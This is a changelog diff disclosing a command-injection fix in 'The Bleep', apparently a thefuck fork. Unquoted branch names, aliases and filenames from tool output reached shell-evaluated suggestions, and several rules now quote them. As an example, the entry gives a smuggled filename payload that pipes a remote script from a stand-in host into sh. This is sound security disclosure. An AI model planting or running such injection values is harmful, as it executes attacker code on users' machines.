@@ -1,5 +1,41 @@
 # Changelog
 
+## 4.0.1 — unreleased
+
+### Security
+
+- **A branch name could run a command.** Seven rules read a name out of the
+  failed command's own output and put it into the suggestion without quoting it,
+  and the suggestion goes to your shell to be evaluated once you accept it. Only
+  whitespace, control characters and `~^:?*[\\` are illegal in a git ref name, so
+  `;`, `$()`, a backtick, `&`, `|` and `#` are all available to whoever named the
+  branch — and a name is not something you chose when you are reviewing somebody
+  else's work or have just cloned a repository.
+
+  `git_push`, `git_pull` and `git_push_different_branch_names` take the branch
+  out of git's own hint. `git_merge` takes a branch name from the remote.
+  `git_help_aliased` takes an alias out of the repository's `.git/config`.
+  `fix_file` takes a filename off disk, which is the one that needs no git at
+  all: unpacking an archive is enough to put `a;curl evil.sh|sh .py` where a
+  compiler will name it back at you. `yarn_alias` and `rails_migrations_pending`
+  repeat a command line out of their tool's output, which is the same shape with
+  less reachable data behind it.
+
+  All eight quote what they read now, and all eight are in
+  `tests/test_injection.py`, which runs each suggestion through a real shell with
+  seven metacharacter payloads and fails if anything executes. That also settles
+  a crash of long standing: a branch called `swteam/#486/general_contact_info`
+  produced a suggestion that broke zsh's `eval`
+  ([nvbn/thefuck#782](https://github.com/nvbn/thefuck/issues/782), and
+  [#600](https://github.com/nvbn/thefuck/issues/600) and
+  [#762](https://github.com/nvbn/thefuck/issues/762) before it), because the
+  upstream fix for that was `.replace("'", r"\\'")` and only ever covered the
+  apostrophe.
+
+  Reported by [@robkorv](https://github.com/robkorv) in
+  [#2](https://github.com/stamparm/thebleep/issues/2), with a working proof of
+  concept for three of them; the other four came out of the sweep that followed.
+
 ## 4.0.0 — 2026-08-19
 
 The first release of *The Bleep*, and the first release of this codebase since
